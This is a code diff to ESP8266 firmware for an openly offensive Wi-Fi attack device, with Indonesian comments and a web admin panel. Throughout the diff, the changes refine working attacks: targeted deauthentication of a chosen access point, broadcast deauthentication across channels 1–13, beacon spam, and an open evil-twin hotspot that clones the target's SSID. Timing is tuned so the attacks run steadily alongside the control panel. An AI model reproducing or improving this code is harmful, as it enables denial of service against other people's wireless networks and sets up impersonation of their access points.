@@ -20,6 +20,10 @@ String selected_ssid = "";
 uint8_t target_ch = 1;
 uint8_t admin_ch = 1; 
 
+// Tambahan buat kestabilan
+unsigned long last_attack_ms = 0;
+const int attack_delay = 100; // Jeda antar serangan biar Web Server gak mati
+
 ESP8266WebServer server(80);
 DNSServer dnsServer;
 
@@ -54,7 +58,7 @@ void spamBeacon() {
   }
 }
 
-// ================= UI ADMIN (INDEX_HTML UTUH) =================
+// ================= UI ADMIN (INDEX_HTML TETAP SAMA) =================
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
 <style>
@@ -155,7 +159,7 @@ void setup() {
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_AP_STA);
   
-  // FIXED: Admin Channel dipaksa 1 biar sinkron
+  // Paksa Admin di Channel 1
   WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
   admin_ch = 1;
   
@@ -170,12 +174,8 @@ void setup() {
     server.send(200, "text/html", html);
   });
 
-  // Handler Captive Portal (PENTING BIAR GAK MENTAL)
-  server.on("/generate_204", []() { server.sendHeader("Location", "/"); server.send(302); });
-  server.on("/redirect", []() { server.sendHeader("Location", "/"); server.send(302); });
-
   server.on("/scan", []() { 
-    wifi_promiscuous_enable(0);
+    wifi_promiscuous_enable(0); // Matikan deauth saat scan
     WiFi.scanNetworks(true, true); 
     server.sendHeader("Location", "/"); 
     server.send(302); 
@@ -187,15 +187,14 @@ void setup() {
     if (t == "rusuh") rusuh_mode = !rusuh_mode;
     if (t == "beacon") beacon_running = !beacon_running;
     if (t == "deauthall") attack_all = !attack_all;
-    if (t == "hotspot") WiFi.softAP(selected_ssid.c_str(), ""); 
-    
-    if(deauth_running || rusuh_mode || attack_all) wifi_promiscuous_enable(1);
-    else wifi_promiscuous_enable(0);
-    
+    if (t == "hotspot") {
+        wifi_promiscuous_enable(0);
+        WiFi.softAP(selected_ssid.c_str(), ""); 
+    }
     server.sendHeader("Location", "/"); server.send(302);
   });
 
-  server.on("/deselect", []() { selected_bssid = ""; selected_ssid = ""; deauth_running = false; server.sendHeader("Location", "/"); server.send(302); });
+  server.on("/deselect", []() { selected_bssid = ""; selected_ssid = ""; deauth_running = false; rusuh_mode = false; attack_all = false; beacon_running = false; wifi_promiscuous_enable(0); server.sendHeader("Location", "/"); server.send(302); });
   server.on("/save", HTTP_POST, []() {
     admin_ssid = server.arg("adm_ssid"); admin_pass = server.arg("adm_pass");
     beacon_count = server.arg("b_count").toInt(); 
@@ -216,26 +215,39 @@ void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
   
-  if (deauth_running && selected_bssid != "") {
+  unsigned long current_ms = millis();
+
+  // Logic DEAUTH TUNGGAL
+  if (deauth_running && selected_bssid != "" && (current_ms - last_attack_ms > attack_delay)) {
+    wifi_promiscuous_enable(1);
     wifi_set_channel(target_ch);
     sendDeauth(selected_bssid);
-    // TRICK STABLE: Wajib balik ke admin_ch buat ngelayanin HP lu
+    
+    // Kembalikan ke channel admin agar koneksi HP tidak putus
     wifi_set_channel(admin_ch); 
-    delay(1); // Kasih nafas radio
+    wifi_promiscuous_enable(0); 
+    last_attack_ms = current_ms;
   }
   
-  if (rusuh_mode || attack_all) {
-    static unsigned long last_hop = 0;
-    if (millis() - last_hop > 100) { 
-      static uint8_t ch = 1;
-      wifi_set_channel(ch);
-      sendDeauth("FF:FF:FF:FF:FF:FF");
-      ch++; if (ch > 13) ch = 1;
-      wifi_set_channel(admin_ch); // Snapback ke admin
-      last_hop = millis();
-    }
+  // Logic RUSUH / DEAUTH ALL
+  if ((rusuh_mode || attack_all) && (current_ms - last_attack_ms > 150)) {
+    wifi_promiscuous_enable(1);
+    static uint8_t ch = 1;
+    wifi_set_channel(ch);
+    sendDeauth("FF:FF:FF:FF:FF:FF");
+    ch++; if (ch > 13) ch = 1;
+    
+    wifi_set_channel(admin_ch);
+    wifi_promiscuous_enable(0);
+    last_attack_ms = current_ms;
   }
   
-  if (beacon_running) { spamBeacon(); yield(); }
+  if (beacon_running && (current_ms - last_attack_ms > 200)) { 
+    wifi_promiscuous_enable(1);
+    spamBeacon(); 
+    wifi_promiscuous_enable(0);
+    last_attack_ms = current_ms;
+  }
+
   yield();
 }
